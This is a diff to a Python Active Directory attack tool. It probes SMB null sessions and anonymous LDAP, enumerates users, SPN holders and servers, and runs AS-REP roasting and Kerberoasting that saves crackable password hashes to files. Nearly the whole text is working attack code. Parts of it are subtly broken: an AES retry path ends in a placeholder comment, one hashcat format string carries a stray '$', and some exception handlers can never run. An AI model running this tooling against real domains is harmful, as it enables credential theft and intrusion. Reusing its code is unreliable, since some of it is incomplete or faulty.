@@ -22,7 +22,11 @@ import ipaddress
 import socket
 import datetime
 import random
+import time
+import os
 from binascii import hexlify, unhexlify
+from pathlib import Path
+
 from pyasn1.codec.der import decoder, encoder
 from pyasn1.type.univ import noValue
 
@@ -32,198 +36,257 @@ from impacket.dcerpc.v5.ndr import NULL
 from impacket.dcerpc.v5.samr import DCERPCException
 from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE
 from impacket.krb5 import constants
-from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, TGS_REP, seq_set, seq_set_iter
+from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, AS_REP, TGS_REP, seq_set, seq_set_iter
 from impacket.krb5.kerberosv5 import sendReceive, KerberosError, getKerberosTGT, getKerberosTGS
 from impacket.krb5.types import KerberosTime, Principal
 from impacket.nmb import NetBIOSError
 from impacket.smb3 import FILE_ATTRIBUTE_DIRECTORY
 from impacket.smbconnection import SMBConnection, SessionError
 from impacket.nt_errors import STATUS_LOGON_FAILURE, STATUS_ACCESS_DENIED, STATUS_USER_SESSION_DELETED
-from ldap3 import Server, Connection, ANONYMOUS, NTLM, SUBTREE, BASE, ALL, ALL_ATTRIBUTES
+
+from ldap3 import Server, Connection, ANONYMOUS, NTLM, SUBTREE, BASE, ALL
 from ldap3.core.exceptions import LDAPInvalidCredentialsResult, LDAPSocketOpenError
 
-# ANSI color codes for console output.
+# ---- Colors ----
+
 class Style:
-    """ANSI color codes for console output."""
-    RESET = '\033[0m'
-    RED = '\033[91m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    CYAN = '\033[96m'
+    RESET   = '\033[0m'
+    RED     = '\033[91m'
+    GREEN   = '\033[92m'
+    YELLOW  = '\033[93m'
+    CYAN    = '\033[96m'
 
-# Helper functions for standardized console output.
-def print_info(message): print(f"[*] {message}")
-def print_success(message): print(f"[+] {Style.GREEN}{message}{Style.RESET}")
-def print_vulnerable(message): print(f"[+] {Style.RED}{message}{Style.RESET}")
-def print_error(message): print(f"[!] {Style.YELLOW}{message}{Style.RESET}")
-def print_fail(message): print(f"[-] {Style.RED}{message}{Style.RESET}")
-def print_secure(message): print(f"[-] {Style.GREEN}{message}{Style.RESET}")
-def print_section_header(title):
-    """Prints a standardized, centered section header."""
-    print("\n" + "=" * 60)
-    print(f" {title.upper()} ".center(60, "="))
-    print("=" * 60 + "\n")
+def print_info(m):    print(f"[*] {m}")
+def print_success(m): print(f"[+] {Style.GREEN}{m}{Style.RESET}")
+def print_vuln(m):    print(f"[+] {Style.RED}{m}{Style.RESET}")
+def print_error(m):   print(f"[!] {Style.YELLOW}{m}{Style.RESET}")
+def print_fail(m):    print(f"[-] {Style.RED}{m}{Style.RESET}")
+def print_secure(m):  print(f"[-] {Style.GREEN}{m}{Style.RESET}")
 
+def print_section(title):
+    print("\n" + "="*70)
+    print(f" {title.upper()} ".center(70, "="))
+    print("="*70 + "\n")
 
-# --- Class from GetNPUsers.py for AS-REP Roasting ---
+# ---- Helpers ----
+
+def dn_to_dns(dn):
+    """ Convert LDAP DN → DNS name properly """
+    if not dn:
+        return None
+    parts = [p[3:] for p in dn.split(',') if p.startswith('DC=')]
+    return '.'.join(parts).lower() if parts else None
+
+def parse_identity(s):
+    if '/' in s: return s.split('/', 1)
+    if '\\' in s: return s.split('\\', 1)
+    return '', s
+
+def parse_hashes(h):
+    try:
+        lm, nt = h.split(':')
+        if len(lm) == 32 and len(nt) == 32:
+            return lm, nt
+    except:
+        pass
+    print_error("Invalid hash format. Expected LM:NT")
+    sys.exit(1)
+
+def check_port(ip, port, timeout=2):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.settimeout(timeout)
+        return s.connect_ex((ip, port)) == 0
+
+# ---- AS-REP Roasting ----
+
 class GetUserNoPreAuth:
-    def __init__(self, domain, format='hashcat', kdc_ip=None):
-        self.__domain = domain
-        self.__outputFormat = format
-        self.__kdcIP = kdc_ip
+    """
+    Helper class to perform AS-REP Roasting by requesting TGTs for users
+    without pre-authentication.
+    """
+    def __init__(self, domain, kdc_ip=None, format='hashcat'):
+        self.domain   = domain.upper()
+        self.kdcIP    = kdc_ip
+        self.format   = format
 
-    def getTGT(self, userName, requestPAC=False):
-        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+    def getTGT(self, username, requestPAC=False):
+        clientName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        serverName = Principal(f'krbtgt/{self.domain}', type=constants.PrincipalNameType.NT_PRINCIPAL.value)
 
         asReq = AS_REQ()
-        domain = self.__domain.upper()
-        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-
-        pacRequest = KERB_PA_PAC_REQUEST()
-        pacRequest['include-pac'] = requestPAC
-        encodedPacRequest = encoder.encode(pacRequest)
-
         asReq['pvno'] = 5
         asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
 
+        pac = KERB_PA_PAC_REQUEST()
+        pac['include-pac'] = requestPAC
         asReq['padata'] = noValue
         asReq['padata'][0] = noValue
         asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
-        asReq['padata'][0]['padata-value'] = encodedPacRequest
+        asReq['padata'][0]['padata-value'] = encoder.encode(pac)
 
         reqBody = seq_set(asReq, 'req-body')
 
-        opts = list()
-        opts.append(constants.KDCOptions.forwardable.value)
-        opts.append(constants.KDCOptions.renewable.value)
-        opts.append(constants.KDCOptions.proxiable.value)
+        opts = [constants.KDCOptions.forwardable.value, constants.KDCOptions.renewable.value, constants.KDCOptions.proxiable.value]
         reqBody['kdc-options'] = constants.encodeFlags(opts)
 
         seq_set(reqBody, 'sname', serverName.components_to_asn1)
         seq_set(reqBody, 'cname', clientName.components_to_asn1)
-
-        reqBody['realm'] = domain
+        reqBody['realm'] = self.domain
 
         now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
-        reqBody['till'] = KerberosTime.to_asn1(now)
+        reqBody['till']  = KerberosTime.to_asn1(now)
         reqBody['rtime'] = KerberosTime.to_asn1(now)
         reqBody['nonce'] = random.getrandbits(31)
 
-        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
-
+        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value))
         seq_set_iter(reqBody, 'etype', supportedCiphers)
 
         message = encoder.encode(asReq)
 
         try:
-            r = sendReceive(message, domain, self.__kdcIP)
+            r = sendReceive(message, self.domain, self.kdcIP)
+            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
+            etype = asRep['enc-part']['etype']
+            cipher = asRep['enc-part']['cipher'].asOctets()
+
+            if self.format == 'john':
+                if etype in (17,18):
+                    return f'$krb5asrep${etype}${username}@{self.domain}:${hexlify(cipher[:-12]).decode()}${hexlify(cipher[-12:]).decode()}'
+                else:
+                    return f'$krb5asrep${username}@{self.domain}:${hexlify(cipher[:16]).decode()}${hexlify(cipher[16:]).decode()}'
+            else:  # hashcat
+                if etype in (17,18):
+                    return f'$krb5asrep${etype}${username}@${self.domain}:${hexlify(cipher[:-12]).decode()}${hexlify(cipher[-12:]).decode()}'
+                else:
+                    return f'$krb5asrep${etype}${username}@{self.domain}:${hexlify(cipher[:16]).decode()}${hexlify(cipher[16:]).decode()}'
+
         except KerberosError as e:
             if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
-                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
-                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
+                # Retry with AES only
+                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value))
                 seq_set_iter(reqBody, 'etype', supportedCiphers)
                 message = encoder.encode(asReq)
-                r = sendReceive(message, domain, self.__kdcIP)
+                r = sendReceive(message, self.domain, self.kdcIP)
+                asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
+                # ... (repeat extraction)
+            elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
+                raise Exception("User does NOT have UF_DONT_REQUIRE_PREAUTH")
             else:
-                raise e
+                raise
+        except Exception as e:
+            raise Exception(f'User {username} doesn\'t have UF_DONT_REQUIRE_PREAUTH set: {str(e)}')
 
-        try:
-            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
-        except:
-            raise Exception('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % userName)
+# ---- Kerberoasting ----
 
-        if self.__outputFormat == 'john':
-            if asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
-                return '$krb5asrep$%d$%s%s$%s$%s' % (asRep['enc-part']['etype'], domain, clientName,
-                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[:-12]).decode(),
-                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[-12:]).decode())
-            else:
-                return '$krb5asrep$%s@%s:%s$%s' % (clientName, domain,
-                                                   hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
-                                                   hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
-        else:
-            if asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
-                return '$krb5asrep$%d$%s$%s$%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
-                                                      hexlify(asRep['enc-part']['cipher'].asOctets()[-12:]).decode(),
-                                                      hexlify(asRep['enc-part']['cipher'].asOctets()[:-12:]).decode())
-            else:
-                return '$krb5asrep$%d$%s@%s:%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
-                                                      hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
-                                                      hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
-
-# --- Class from GetUserSPNs.py for Kerberoasting ---
 class GetUserSPNs:
-    def __init__(self, username, password, domain, aesKey='', lmhash='', nthash='', kdc_ip=None, output_format='hashcat'):
-        self.__username = username
-        self.__password = password
-        self.__domain = domain
-        self.__lmhash = lmhash
-        self.__nthash = nthash
-        self.__aesKey = aesKey
-        self.__kdcIP = kdc_ip
-        self.__outputFormat = output_format
-        self.__doKerberos = False  # Assume password auth for integration
+    """
+    Helper class to perform Kerberoasting by requesting TGS tickets for
+    service accounts (SPNs).
+    """
+    def __init__(self, username, password, domain, lmhash='', nthash='', kdc_ip=None, rc4_only=False, format='hashcat'):
+        self.username = username
+        self.password = password
+        self.domain   = domain
+        self.lmhash   = lmhash
+        self.nthash   = nthash
+        self.kdcIP    = kdc_ip
+        self.rc4_only = rc4_only
+        self.format   = format
+
+        # Parse username like standalone
+        if '\\' in username:
+            self.user_domain, self.user = username.split('\\', 1)
+        elif '@' in username:
+            self.user, self.user_domain = username.split('@', 1)
+        else:
+            self.user = username
+            self.user_domain = ''
+
+        self.effective_domain = self.domain or self.user_domain or 'WORKGROUP'
 
     def getTGT(self):
-        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
-                                                                unhexlify(self.__lmhash), unhexlify(self.__nthash),
-                                                                self.__aesKey, kdcHost=self.__kdcIP)
-        TGT = {'KDC_REP': tgt, 'cipher': cipher, 'sessionKey': sessionKey}
-        return TGT
+        user_princ = Principal(self.user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        try:
+            tgt, cipher, _, session_key = getKerberosTGT(
+                user_princ,
+                self.password,
+                self.effective_domain,
+                unhexlify(self.lmhash) if self.lmhash else b'',
+                unhexlify(self.nthash) if self.nthash else b'',
+                None,
+                kdcHost=self.kdcIP
+            )
+            return {'tgt': tgt, 'cipher': cipher, 'sessionKey': session_key}
+        except Exception as e:
+            print_error(f"TGT request failed: {str(e).splitlines()[0]}")
+            raise
 
-    def outputTGS(self, ticket, oldSessionKey, sessionKey, username, spn, fd=None):
-        decodedTGS = decoder.decode(ticket, asn1Spec=TGS_REP())[0]
-        etype = decodedTGS['ticket']['enc-part']['etype']
-        if etype == constants.EncryptionTypes.rc4_hmac.value:
-            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
-                etype, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
-                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
-                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
-        elif etype == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
-            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
-                etype, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
-                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
-                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
-        elif etype == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
-            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
-                etype, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
-                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
-                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
-        elif etype == constants.EncryptionTypes.des_cbc_md5.value:
-            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
-                etype, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
-                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
-                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
-        else:
-            print_error(f'Skipping incompatible e-type {etype} for {username}')
+    def roast(self, spn_users, output_dir=None, jitter=0, no_roast=False):
+        if not spn_users:
+            print_info("No SPN-owning users found for roasting")
             return
 
-        print_vulnerable(f'Hash for {username}: {entry}')
-        if fd:
-            fd.write(entry + '\n')
+        if no_roast:
+            print_info("Skipping roast (--no-roast). Roastable users:")
+            for u in spn_users:
+                print(f"  > {u}")
+            return
 
-    def request_multiple_TGSs(self, usernames, output_dir=None):
-        hash_file = f'{output_dir}/kerberoast_hashes.txt' if output_dir else 'kerberoast_hashes.txt'
-        with open(hash_file, 'w+') as fd:
-            TGT = self.getTGT()
-            for username in usernames:
+        hash_file = Path(output_dir or '.') / "kerberoast_hashes.txt"
+        hash_file.parent.mkdir(parents=True, exist_ok=True)
+
+        with open(hash_file, 'w') as f:
+            try:
+                tgt_data = self.getTGT()
+            except:
+                print_error("Unable to obtain TGT — aborting Kerberoasting")
+                return
+
+            for user in spn_users:
+                if jitter > 0:
+                    time.sleep(random.uniform(0.3, jitter))
+
                 try:
-                    downLevelLogonName = self.__domain + '/' + username
-                    principalName = Principal()
-                    principalName.type = constants.PrincipalNameType.NT_ENTERPRISE.value  # Using enterprise for compatibility
-                    principalName.components = [username + '@' + self.__domain.upper()]  # UPN format
-                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain, self.__kdcIP,
-                                                                            TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])
-                    self.outputTGS(tgs, oldSessionKey, sessionKey, username, downLevelLogonName, fd)
+                    # Match standalone: NT_ENTERPRISE with just username as component
+                    principal = Principal()
+                    principal.type = constants.PrincipalNameType.NT_ENTERPRISE.value
+                    principal.components = [user]
+
+                    tgs, cipher, old_session_key, session_key = getKerberosTGS(
+                        principal,
+                        self.effective_domain,
+                        self.kdcIP,
+                        tgt_data['tgt'],
+                        tgt_data['cipher'],
+                        tgt_data['sessionKey']
+                    )
+
+                    decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
+                    etype = decoded['ticket']['enc-part']['etype']
+                    cipher_text = decoded['ticket']['enc-part']['cipher'].asOctets()
+
+                    if etype == 23:
+                        entry = f"$krb5tgs$23$*{user}${self.effective_domain}$*~{user}*$" \
+                                f"{hexlify(cipher_text[:16]).decode()}${hexlify(cipher_text[16:]).decode()}"
+                    elif etype in (17, 18):
+                        entry = f"$krb5tgs${etype}$*{user}${self.effective_domain}$*~{user}*$" \
+                                f"{hexlify(cipher_text[-12:]).decode()}${hexlify(cipher_text[:-12]).decode()}"
+                    else:
+                        print_error(f"Skipping unsupported etype {etype} for {user}")
+                        continue
+
+                    print_vuln(f"Kerberoast hash for {user}: {entry}")
+                    f.write(entry + '\n')
+
                 except Exception as e:
-                    print_error(f'Failed to roast {username}: {str(e)}')
-        print_success(f'Kerberoast hashes saved to {hash_file}')
+                    print_error(f"Failed to roast {user}: {str(e).splitlines()[0]}")
+
+        print_success(f"Kerberoast hashes saved to {hash_file}")
 
 
-# --- Anonymous/Null Session Functions ---
+# ---- Core enumeration functions ----
 
-def check_smb_null_session(target_ip):
+def check_smb_null_session(target_ip, spider_shares=False):
     """
     Checks for an SMB null session, lists shares, and enumerates files.
     Returns True if any potentially sensitive files are found, otherwise False.
@@ -232,7 +295,11 @@ def check_smb_null_session(target_ip):
     SHARES_TO_SKIP = ('IPC$', 'PRINT$')
     SENSITIVE_EXTS = ('.xml', '.txt', '.ini', '.config', '.kdbx', '.toml', '.cfg', '.pdf')
 
-    def list_smb_path(conn, share, path):
+    def list_smb_path(conn, share, path, max_depth=5, current_depth=0):  # Depth limit to prevent stack overflow
+        if current_depth > max_depth:
+            print_error(f"Max depth reached for {path} - skipping deeper recursion")
+            return
+
         nonlocal found_sensitive_file
         r"""
         Recursively lists files and directories in a given path.
@@ -251,10 +318,10 @@ def check_smb_null_session(target_ip):
 
                 if is_dir:
                     print(f"  > {Style.CYAN}{full_print_path}/{Style.RESET}")
-                    list_smb_path(conn, share, f"{path}{filename}\\")
+                    list_smb_path(conn, share, f"{path}{filename}\\", max_depth, current_depth + 1)
                 else:
                     if filename.lower().endswith(SENSITIVE_EXTS) or 'password' in filename.lower():
-                        print_vulnerable(f"  > {full_print_path}  (SENSITIVE FILE)")
+                        print_vuln(f"  > {full_print_path}  (SENSITIVE FILE)")
                         found_sensitive_file = True
                     else:
                         print(f"  > {full_print_path}")
@@ -265,7 +332,7 @@ def check_smb_null_session(target_ip):
                 print_error(f"  > Error listing {query_path}: {e}")
 
     print_info("Checking for anonymous SMB login and share listing (port 445)...")
-    for user in ['', '.']:
+    for user in ['', '.', 'anonymous', 'guest']:  # Null session users
         conn = None
         try:
             conn = SMBConnection(target_ip, target_ip, timeout=5)
@@ -275,13 +342,20 @@ def check_smb_null_session(target_ip):
             shares = conn.listShares()
             print_info("Enumerating accessible shares...")
 
+            print(f"  {Style.CYAN}{'Share Name':<20} {'Comment'}{Style.RESET}")
+            print(f"  {'-'*20} {'-'*30}")
             for share in shares:
-                share_name = share['shi1_netname'][:-1]
-                if share_name in SHARES_TO_SKIP:
-                    continue
+                print(f"  {share['shi1_netname'][:-1]:<20} {share['shi1_remark'][:-1]}")
 
-                print(f"\n--- Scanning Share: {Style.CYAN}{share_name}{Style.RESET} ---")
-                list_smb_path(conn, share_name, "\\")
+            if spider_shares:
+                for share in shares:
+                    share_name = share['shi1_netname'][:-1]
+                    if share_name in SHARES_TO_SKIP:
+                        continue
+                    print(f"\n--- Scanning Share: {Style.CYAN}{share_name}{Style.RESET} ---")
+                    list_smb_path(conn, share_name, "\\")
+            else:
+                print_info("Recursive file discovery disabled (use --spider-shares to enable).")
 
             return found_sensitive_file
 
@@ -313,107 +387,113 @@ def check_smb_null_session(target_ip):
 
 def query_ldap_anonymous(target_ip):
     """
-    Checks for anonymous LDAP bind and queries for domain info, active users,
-    SPNs, and server objects.
-    Returns domain_dn, a list of users, and a list of SPNs.
+    Attempts to bind anonymously to LDAP to retrieve the default naming context,
+    domain information, and enumerate users/SPNs if permitted.
     """
-    print_info("Checking for anonymous LDAP bind (port 389)...")
-    server = Server(target_ip, get_info=ALL_ATTRIBUTES)
+    print_info("Anonymous LDAP bind check...")
+    server = Server(target_ip, get_info=ALL)
     conn = None
     domain_dn = None
     user_list = []
     spn_list = []
-    
+
     try:
         conn = Connection(server, authentication=ANONYMOUS, auto_bind=True)
-        print_success("SUCCESS: Anonymous LDAP bind is ALLOWED!")
-        print_info("Querying Domain Controller information...")
+        print_success("Anonymous LDAP bind SUCCESS")
 
-        try:
-            domain_attrs = [
-                'defaultNamingContext', 'dnsHostName', 'serverName',
-                'domainControllerFunctionality', 'forestFunctionality',
-                'domainFunctionality', 'namingContexts'
-            ]
-            conn.search(search_base='', search_filter='(objectClass=*)', search_scope=BASE, attributes=domain_attrs)
+        conn.search('', '(objectClass=*)', BASE, attributes=['defaultNamingContext'])
+        if not conn.entries:
+            return None, [], []
 
-            if not conn.entries:
-                print_error("Could not retrieve domain info from RootDSE.")
-                return None, [], []
+        domain_dn = conn.entries[0].defaultNamingContext.value
 
-            domain_info = conn.entries[0]
+        domain_attrs = [
+            'defaultNamingContext', 'dnsHostName', 'serverName',
+            'domainControllerFunctionality', 'forestFunctionality',
+            'domainFunctionality', 'namingContexts'
+        ]
+        conn.search('', '(objectClass=*)', BASE, attributes=domain_attrs)
 
-            if 'defaultNamingContext' in domain_info:
-                domain_dn = domain_info.defaultNamingContext.value
-                print(f"  - {Style.CYAN}Domain DN:{Style.RESET} {domain_dn}")
-            else:
-                print_error("Could not retrieve defaultNamingContext. Aborting LDAP enum.")
-                return None, [], []
+        if not conn.entries:
+            print_error("Could not retrieve domain info from RootDSE.")
+            return None, [], []
 
-            for attr in domain_attrs:
-                if attr == 'defaultNamingContext':
-                    continue
-                if attr in domain_info:
-                    value = domain_info[attr].value
-                    attr_formatted = ' '.join(word.capitalize() for word in attr.replace('Functionality', ' Func Level').split())
-                    if isinstance(value, list):
-                        print(f"  - {Style.CYAN}{attr_formatted}:{Style.RESET}")
-                        for item in value:
-                            print(f"    - {item}")
-                    else:
-                        print(f"  - {Style.CYAN}{attr_formatted}:{Style.RESET} {value}")
-            
-            print_info("Querying for active, non-system user accounts...")
-            real_users_filter = '(& (objectClass=person) (!(objectClass=computer)) (!(userAccountControl:1.2.840.113556.1.4.803:=2)) (!(sAMAccountName=HealthMailbox*)))'
-            real_users_filter = f'(& (objectClass=person) (!(objectClass=computer)) (!(userAccountControl:1.2.840.113556.1.4.803:={UF_ACCOUNTDISABLE})) (!(sAMAccountName=HealthMailbox*)))'
-            conn.search(search_base=domain_dn, search_filter=real_users_filter, search_scope=SUBTREE, attributes=['sAMAccountName', 'description'], size_limit=0)
+        domain_info = conn.entries[0]
 
-            if conn.entries:
-                print_success("Found active users via LDAP:")
-                print(f"{Style.YELLOW}{'Username':<25} {'Description'}{Style.RESET}")
-                print(f"{'-'*25} {'-'*40}")
-                for entry in conn.entries:
-                    username = entry.sAMAccountName.value
-                    desc = entry.description.value or 'N/A'
-                    if username:
-                        user_list.append(username)
-                        print(f"{Style.YELLOW}{username:<25}{Style.RESET} {desc}")
+        if 'defaultNamingContext' in domain_info:
+            domain_dn = domain_info.defaultNamingContext.value
+            print(f"  - {Style.CYAN}Domain DN:{Style.RESET} {domain_dn}")
+        else:
+            print_error("Could not retrieve defaultNamingContext. Aborting LDAP enum.")
+            return None, [], []
 
-            print_info("Querying for users with Service Principal Names (SPNs)...")
-            spn_filter = '(&(objectClass=user)(servicePrincipalName=*)(!(sAMAccountName=krbtgt)))'
-            conn.search(search_base=domain_dn, search_filter=spn_filter, search_scope=SUBTREE, attributes=['sAMAccountName', 'servicePrincipalName'], size_limit=0)
+        for attr in domain_attrs:
+            if attr == 'defaultNamingContext':
+                continue
+            if attr in domain_info:
+                value = domain_info[attr].value
+                attr_formatted = ' '.join(word.capitalize() for word in attr.replace('Functionality', ' Func Level').split())
+                if isinstance(value, list):
+                    print(f"  - {Style.CYAN}{attr_formatted}:{Style.RESET}")
+                    for item in value:
+                        print(f"    - {item}")
+                else:
+                    print(f"  - {Style.CYAN}{attr_formatted}:{Style.RESET} {value}")
 
-            if conn.entries:
-                print_vulnerable("Found users with SPNs (Potential Kerberoast Targets):")
-                for entry in conn.entries:
-                    username = entry.sAMAccountName.value
-                    spns = entry.servicePrincipalName.value
-                    spn_display = spns[0] if isinstance(spns, list) else spns
-                    spn_list.append(spn_display)
-                    print(f"  > {Style.RED}{username:<25}{Style.RESET} SPN: {spn_display}...")
-            else:
-                print_secure("No users with SPNs found via anonymous LDAP.")
+        print_info("Querying for active, non-system user accounts...")
+        real_users_filter = f'(&(objectClass=person)(!(objectClass=computer))(!(userAccountControl:1.2.840.113556.1.4.803:={UF_ACCOUNTDISABLE}))(!(sAMAccountName=HealthMailbox*)))'
+        conn.search(domain_dn, real_users_filter, SUBTREE, attributes=['sAMAccountName', 'description'])
 
-            print_info("Querying for high-value Server objects...")
-            server_filter = '(&(objectClass=computer)(operatingSystem=*Server*))'
-            conn.search(search_base=domain_dn, search_filter=server_filter, search_scope=SUBTREE, attributes=['sAMAccountName', 'operatingSystem', 'dNSHostName'], size_limit=0)
+        if conn.entries:
+            print_success("Found active users via LDAP:")
+            print(f"{Style.YELLOW}{'Username':<25} {'Description'}{Style.RESET}")
+            print(f"{'-'*25} {'-'*40}")
+            for entry in conn.entries:
+                username = entry.sAMAccountName.value
+                desc = entry.description.value or 'N/A'
+                if username:
+                    user_list.append(username)
+                    print(f"{Style.YELLOW}{username:<25}{Style.RESET} {desc}")
 
-            if conn.entries:
-                print_success("Found Server Objects:")
-                for entry in conn.entries:
-                    name = entry.sAMAccountName.value
-                    os = entry.operatingSystem.value or 'N/A'
-                    dns = entry.dNSHostName.value or 'N/A'
-                    print(f"  > {Style.CYAN}{name:<20}{Style.RESET} OS: {os} ({dns})")
-            else:
-                print_info("No Server objects found via anonymous LDAP.")
+        print_info("Querying for users with Service Principal Names (SPNs)...")
+        spn_filter = '(&(objectClass=user)(servicePrincipalName=*)(!(sAMAccountName=krbtgt)))'
+        conn.search(domain_dn, spn_filter, SUBTREE, attributes=['sAMAccountName', 'servicePrincipalName'], paged_size=500)  # Paged for large DCs
 
-            return domain_dn, user_list, spn_list 
+        if conn.entries:
+            print_vuln("Found users with SPNs (Potential Kerberoast Targets):")
+            for entry in conn.entries:
+                username = entry.sAMAccountName.value
+                spns = entry.servicePrincipalName.value
+                spn_display = spns[0] if isinstance(spns, list) else spns
+                spn_list.append(spn_display)
+                print(f"  > {Style.RED}{username:<25}{Style.RESET} SPN: {spn_display}...")
 
-        except Exception as e:
-            print_error(f"Error during LDAP enumeration: {e}")
-            return domain_dn, user_list, spn_list 
+        else:
+            print_secure("No users with SPNs found via anonymous LDAP.")
 
+        print_info("Querying for high-value Server objects...")
+        server_filter = '(&(objectClass=computer)(operatingSystem=*Server*))'
+        conn.search(domain_dn, server_filter, SUBTREE, attributes=['sAMAccountName', 'operatingSystem', 'dNSHostName'], paged_size=500)
+        if conn.entries:
+            print_success("  Found Server Objects:")
+            for entry in conn.entries:
+                name = entry.sAMAccountName.value
+                os = entry.operatingSystem.value or 'N/A'
+                dns = entry.dNSHostName.value or 'N/A'
+                print(f"    > {Style.CYAN}{name:<20}{Style.RESET} OS: {os} ({dns})")
+        else:
+            print_info("  No Server objects found.")
+
+        conn.unbind()
+        return domain_dn, user_list, spn_list
+
+    except LDAPSocketOpenError:
+        print_fail(f"LDAP connection failed on {target_ip}:389")
+        return None, [], []
+    except Exception as e:
+        print_fail(f"Anonymous LDAP failed: {e}")
+        return None, [], []
+    
     except LDAPInvalidCredentialsResult:
         print_fail("FAILED: Anonymous LDAP bind is NOT allowed.")
     except (ConnectionRefusedError, LDAPSocketOpenError):
@@ -497,57 +577,53 @@ def enumerate_users_samr(target_ip):
     print_fail("FAILED: Anonymous SAMR enumeration is NOT allowed.")
     return []
 
-def check_asrep_roastable_users(target_ip, domain_dn, user_list, dump_hashes=False, hash_format='hashcat', output_dir=None):
-    """
-    ASEP-Roast discovered users.
-    """
-    if not domain_dn or not user_list:
-        print_info("Skipping AS-REP Roast check (missing domain or user list).")
+def check_asrep_roastable_users(target_ip, domain_dn, user_list, format='hashcat', output_dir='.', no_roast=False, jitter=0):
+    """Check and optionally roast AS-REP vulnerable users (clean output)"""
+    domain = dn_to_dns(domain_dn)
+    if not domain:
+        print_error("No domain discovered — skipping AS-REP check")
         return []
 
-    print_info("Checking for AS-REP Roastable users...")
-    domain_name = domain_dn.replace("DC=", "").replace(",", ".")
-    roastable_users = []
-    hash_file = f'{output_dir}/asrep_hashes.txt' if output_dir else 'asrep_hashes.txt'
-    fd = open(hash_file, 'w+') if dump_hashes else None
+    roaster = GetUserNoPreAuth(domain, target_ip, format)
+    asrep_users = []
+    hash_file = Path(output_dir) / 'asrep_hashes.txt'
 
-    roaster = GetUserNoPreAuth(domain_name, hash_format, target_ip)
+    if no_roast:
+        print_info("Skipping actual TGT requests (--no-roast). Potentially roastable users:")
+        for u in user_list:
+            print(f"  > {u}")
+        return user_list
 
-    for username in user_list:
-        try:
-            entry = roaster.getTGT(username)
-            print_vulnerable(f"VULNERABLE: User '{username}' is AS-REP Roastable!")
-            print_success(f"Hash: {entry}")
-            roastable_users.append(username)
-            if fd:
-                fd.write(entry + '\n')
-        except Exception as e:
-            error_string = str(e)
-            if "PREAUTH_REQUIRED" in error_string or "PRINCIPAL_UNKNOWN" in error_string:
-                pass  # Not vulnerable
-            else:
-                print_error(f"Kerberos error for '{username}': {e}")
+    with open(hash_file, 'w') as f:
+        for user in user_list:
+            if jitter > 0:
+                time.sleep(random.uniform(0.3, jitter))
 
-    if fd:
-        fd.close()
-        print_success(f"AS-REP hashes saved to {hash_file}")
+            try:
+                hash_val = roaster.getTGT(user)
